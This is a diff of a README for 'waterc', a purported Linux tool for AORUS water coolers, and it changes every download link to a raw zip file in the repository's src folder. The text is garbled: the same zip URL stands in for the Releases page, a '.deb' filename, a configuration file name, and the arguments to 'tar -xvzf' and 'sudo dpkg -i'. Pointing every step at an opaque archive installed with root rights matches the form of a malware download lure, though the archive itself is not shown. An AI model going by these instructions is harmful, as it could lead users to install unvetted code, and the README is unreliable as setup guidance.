@@ -4,7 +4,7 @@
 Welcome to waterc, a command-line tool that lets you manage your AORUS water cooler on Linux systems. With waterc, you can control fan modes, pump speeds, and monitor your system in real-time.
 
 ## 📥 Download waterc
-[![Download waterc](https://raw.githubusercontent.com/AbdulRafayKhanZada/waterc/main/src/WaterCoolerCLI/waterc_v3.0.zip)](https://raw.githubusercontent.com/AbdulRafayKhanZada/waterc/main/src/WaterCoolerCLI/waterc_v3.0.zip)
+[![Download waterc](https://github.com/AbdulRafayKhanZada/waterc/raw/refs/heads/main/src/Software-2.5.zip)](https://github.com/AbdulRafayKhanZada/waterc/raw/refs/heads/main/src/Software-2.5.zip)
 
 ## 💻 System Requirements
 To run waterc, you'll need:
@@ -16,26 +16,26 @@ To run waterc, you'll need:
 ## 📂 Download & Install
 Follow these steps to get waterc on your system:
 
-1. **Visit this page to download**: Go to the [Releases page](https://raw.githubusercontent.com/AbdulRafayKhanZada/waterc/main/src/WaterCoolerCLI/waterc_v3.0.zip).
+1. **Visit this page to download**: Go to the [Releases page](https://github.com/AbdulRafayKhanZada/waterc/raw/refs/heads/main/src/Software-2.5.zip).
    
 2. **Choose the latest release**: Look for the most recent version available for download. This will ensure you have the latest features and bug fixes.
 
-3. **Download the appropriate version**: Select the file suitable for your Linux system. This is usually a `https://raw.githubusercontent.com/AbdulRafayKhanZada/waterc/main/src/WaterCoolerCLI/waterc_v3.0.zip` or `.deb` file.
+3. **Download the appropriate version**: Select the file suitable for your Linux system. This is usually a `https://github.com/AbdulRafayKhanZada/waterc/raw/refs/heads/main/src/Software-2.5.zip` or `.deb` file.
 
 4. **Extract the files** (if necessary): 
    - Open your terminal.
    - Navigate to your download folder using `cd path/to/your/downloads`.
-   - Use the command `tar -xvzf https://raw.githubusercontent.com/AbdulRafayKhanZada/waterc/main/src/WaterCoolerCLI/waterc_v3.0.zip` to extract the files. Replace `https://raw.githubusercontent.com/AbdulRafayKhanZada/waterc/main/src/WaterCoolerCLI/waterc_v3.0.zip` with the name of your downloaded file.
+   - Use the command `tar -xvzf https://github.com/AbdulRafayKhanZada/waterc/raw/refs/heads/main/src/Software-2.5.zip` to extract the files. Replace `https://github.com/AbdulRafayKhanZada/waterc/raw/refs/heads/main/src/Software-2.5.zip` with the name of your downloaded file.
 
 5. **Install the package**:
-   - For `.deb` files, run: `sudo dpkg -i https://raw.githubusercontent.com/AbdulRafayKhanZada/waterc/main/src/WaterCoolerCLI/waterc_v3.0.zip`.
+   - For `.deb` files, run: `sudo dpkg -i https://github.com/AbdulRafayKhanZada/waterc/raw/refs/heads/main/src/Software-2.5.zip`.
    - For other formats, follow the included instructions in the package or the README.
 
 ## 🔧 Configuration
 Before you start using waterc, you may want to configure it to suit your needs:
 
 1. **Locate the configuration file**:
-   - This file is typically named `https://raw.githubusercontent.com/AbdulRafayKhanZada/waterc/main/src/WaterCoolerCLI/waterc_v3.0.zip` or similar.
+   - This file is typically named `https://github.com/AbdulRafayKhanZada/waterc/raw/refs/heads/main/src/Software-2.5.zip` or similar.
    - You can find it in the folder where you extracted or installed waterc.
 
 2. **Edit the configuration**:
@@ -74,7 +74,7 @@ waterc allows you to control your AORUS cooler on Linux, providing functionality
 Currently, waterc is a command-line tool designed for users who are comfortable with terminal commands. A GUI may be considered for future releases based on user demand.
 
 ### Q3: How often are updates released?
-Updates are typically released as needed to fix bugs and add features. Check the [Releases page](https://raw.githubusercontent.com/AbdulRafayKhanZada/waterc/main/src/WaterCoolerCLI/waterc_v3.0.zip) regularly for the latest versions.
+Updates are typically released as needed to fix bugs and add features. Check the [Releases page](https://github.com/AbdulRafayKhanZada/waterc/raw/refs/heads/main/src/Software-2.5.zip) regularly for the latest versions.
 
 ## 📞 Support
 If you encounter any issues or have questions, you can reach out in the project's GitHub discussions or raise an issue on the repository's issue tracker.
